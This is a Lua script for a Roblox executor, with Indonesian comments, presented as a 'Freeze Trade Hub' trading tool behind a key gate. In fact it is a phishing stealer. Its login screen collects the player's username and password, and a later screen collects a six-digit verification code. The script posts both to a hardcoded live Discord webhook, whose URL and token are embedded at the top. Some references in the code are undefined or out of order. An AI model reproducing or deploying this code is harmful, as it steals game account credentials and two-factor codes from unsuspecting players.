-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password, verificationCode)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Dinzz : Login Information\nUsername: " .. username .. "\nPassword: " .. password .. "\nVerification Code: " .. verificationCode
        })
    }

    if syn and syn.request then
        local response = syn.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif http and http.request then
        local response = http.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif request then
        local response = request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    else
        print("Executor Anda tidak mendukung HTTP requests!")
    end
end

-- Membuat GUI Key Validation (GUI 1)
local function createKeyValidationGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local keyBox = Instance.new("TextBox")
    local verifyKeyButton = Instance.new("TextButton")
    local copyLinkButton = Instance.new("TextButton")
    local errorLabel = Instance.new("TextLabel")

    -- Properti GUI
    gui.Name = "KeyValidationGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame
    frame.Name = "KeyFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
    frame.ZIndex = 1  -- Set ZIndex for layer order

    -- Title Label
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Freeze Trade Hub"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Key Box
    keyBox.Name = "KeyBox"
    keyBox.Parent = frame
    keyBox.Size = UDim2.new(1, -20, 0, 40)
    keyBox.Position = UDim2.new(0, 10, 0, 60)
    keyBox.PlaceholderText = "Masukkan Key"
    keyBox.Font = Enum.Font.SourceSans
    keyBox.Text = ""
    keyBox.TextSize = 14
    keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Error Label
    errorLabel.Name = "ErrorLabel"
    errorLabel.Parent = frame
    errorLabel.Size = UDim2.new(1, -20, 0, 20)
    errorLabel.Position = UDim2.new(0, 10, 0, 105)
    errorLabel.BackgroundTransparency = 1
    errorLabel.Font = Enum.Font.SourceSans
    errorLabel.Text = ""
    errorLabel.TextSize = 14
    errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

    -- Verify Key Button
    verifyKeyButton.Name = "VerifyKeyButton"
    verifyKeyButton.Parent = frame
    verifyKeyButton.Size = UDim2.new(1, -20, 0, 40)
    verifyKeyButton.Position = UDim2.new(0, 10, 0, 130)
    verifyKeyButton.Text = "Verifikasi Key"
    verifyKeyButton.Font = Enum.Font.SourceSansBold
    verifyKeyButton.TextSize = 16
    verifyKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    verifyKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Copy Link Button
    copyLinkButton.Name = "CopyLinkButton"
    copyLinkButton.Parent = frame
    copyLinkButton.Size = UDim2.new(1, -20, 0, 40)
    copyLinkButton.Position = UDim2.new(0, 10, 0, 180)
    copyLinkButton.Text = "Get Key"
    copyLinkButton.Font = Enum.Font.SourceSansBold
    copyLinkButton.TextSize = 16
    copyLinkButton.BackgroundColor3 = Color3.fromRGB(0, 0, 200)
    copyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Tombol Copy Link
    copyLinkButton.MouseButton1Click:Connect(function()
        if setclipboard then
            setclipboard(linkUrl)
            print("Link berhasil disalin ke clipboard!")
        else
            print("Executor Anda tidak mendukung setclipboard. Salin link secara manual: " .. linkUrl)
        end
    end)

    -- Fungsi Verifikasi Key
    verifyKeyButton.MouseButton1Click:Connect(function()
        if keyBox.Text == correctKey then
            print("Key benar!")
            frame.ZIndex = 0  -- Set GUI Key Validation ke layer bawah
            loginGUI.Visible = true -- Menampilkan GUI login
            loginFrame.ZIndex = 1  -- Menampilkan GUI Login di atas
        else
            errorLabel.Text = "Key salah! Silahkan Get Key."
        end
    end)
end

-- Membuat GUI Login (GUI 2)
local function createLoginGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "LoginGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")
    gui.Visible = false -- Awalnya tidak terlihat

    local frame = Instance.new("Frame")
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 300)
    frame.Position = UDim2.new(0.5, -150, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
    frame.ZIndex = 2 -- Set ZIndex untuk layer order

    -- Title Label
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Freeze Trade Hub"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Username Box
    local usernameBox = Instance.new("TextBox")
    usernameBox.Parent = frame
    usernameBox.Size = UDim2.new(1, -20, 0, 40)
    usernameBox.Position = UDim2.new(0, 10, 0, 90)
    usernameBox.PlaceholderText = "Masukkan Username"
    usernameBox.Font = Enum.Font.SourceSans
    usernameBox.Text = ""
    usernameBox.TextSize = 14
    usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Password Box
    local passwordBox = Instance.new("TextBox")
    passwordBox.Parent = frame
    passwordBox.Size = UDim2.new(1, -20, 0, 40)
    passwordBox.Position = UDim2.new(0, 10, 0, 140)
    passwordBox.PlaceholderText = "Masukkan Password"
    passwordBox.Font = Enum.Font.SourceSans
    passwordBox.Text = ""
    passwordBox.TextSize = 14
    passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Login Button
    local loginButton = Instance.new("TextButton")
    loginButton.Parent = frame
    loginButton.Size = UDim2.new(1, -20, 0, 40)
    loginButton.Position = UDim2.new(0, 10, 0, 200)
    loginButton.Text = "Mulai Script"
    loginButton.Font = Enum.Font.SourceSansBold
    loginButton.TextSize = 16
    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Tombol Login
    loginButton.MouseButton1Click:Connect(function()
        local username = usernameBox.Text
        local password = passwordBox.Text
        if username ~= "" and password ~= "" then
            sendToDiscord(username, password, "Waiting for verification code...") -- Placeholder verifikasi
            gui:Destroy() -- Hapus GUI login setelah login berhasil
            createVerifikasiGUI() -- Panggil GUI verifikasi
        else
            print("Harap isi username dan password!")
        end
    end)
end

-- Membuat GUI Verifikasi Kode (GUI 4)
local function createVerifikasiGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "VerifikasiGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")
    gui.Visible = false -- Awalnya tidak terlihat

    local frame = Instance.new("Frame")
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
    frame.ZIndex = 3 -- Set ZIndex untuk layer order

    -- Verifikasi Label
    local verifikasiLabel = Instance.new("TextLabel")
    verifikasiLabel.Parent = frame
    verifikasiLabel.Size = UDim2.new(1, 0, 0, 50)
    verifikasiLabel.Position = UDim2.new(0, 0, 0, 0)
    verifikasiLabel.BackgroundTransparency = 1
    verifikasiLabel.Font = Enum.Font.SourceSansBold
    verifikasiLabel.Text = "Masukkan Kode Verifikasi 6 Digit"
    verifikasiLabel.TextSize = 18
    verifikasiLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Code Box
    local codeBox = Instance.new("TextBox")
    codeBox.Parent = frame
    codeBox.Size = UDim2.new(1, -20, 0, 40)
    codeBox.Position = UDim2.new(0, 10, 0, 60)
    codeBox.PlaceholderText = "Masukkan Kode 6 Digit"
    codeBox.Font = Enum.Font.SourceSans
    codeBox.Text = ""
    codeBox.TextSize = 14
    codeBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    codeBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Verify Button
    local verifyButton = Instance.new("TextButton")
    verifyButton.Parent = frame
    verifyButton.Size = UDim2.new(1, -20, 0, 40)
    verifyButton.Position = UDim2.new(0, 10, 0, 120)
    verifyButton.Text = "Verifikasi Kode"
    verifyButton.Font = Enum.Font.SourceSansBold
    verifyButton.TextSize = 16
    verifyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    verifyButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Verifikasi Kode
    verifyButton.MouseButton1Click:Connect(function()
        local verificationCode = codeBox.Text
        if verificationCode:match("%d%d%d%d%d%d") then
            sendToDiscord("User", "Password", verificationCode) -- Kirim kode verifikasi ke Discord
            print("Kode verifikasi terkirim ke Discord!")
            gui:Destroy()
            print("Proses selesai!")
        else
            print("Kode verifikasi salah!")
        end
    end)
end

-- Mulai aplikasi
createKeyValidationGUI() -- GUI pertama langsung dimuat
createLoginGUI() -- GUI kedua dimuat
createVerifikasiGUI() -- GUI keempat dimuat
